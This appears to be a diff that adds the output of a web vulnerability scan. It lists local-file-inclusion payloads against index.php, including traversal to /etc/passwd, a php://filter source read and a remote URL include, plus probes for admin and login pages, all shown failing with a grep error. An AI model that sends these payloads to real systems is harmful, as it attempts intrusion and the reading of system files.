@@ -1,0 +1,16 @@
+/index.php?url=....//....//....//etc/passwd                    [000] grep: /tmp/jj: No such file or directory
+
+/index.php?url=/etc/passwd                                     [000] grep: /tmp/jj: No such file or directory
+
+/index.php?url=php://filter/convert.base64-encode/resource=index [000] grep: /tmp/jj: No such file or directory
+
+/index.php?url=http://www.google.com/                          [000] grep: /tmp/jj: No such file or directory
+
+/admin/                                                        [000] grep: /tmp/jj: No such file or directory
+
+/admin/index.php                                               [000] grep: /tmp/jj: No such file or directory
+
+/login.php                                                     [000] grep: /tmp/jj: No such file or directory
+
+/administrator/                                                [000] grep: /tmp/jj: No such file or directory
+
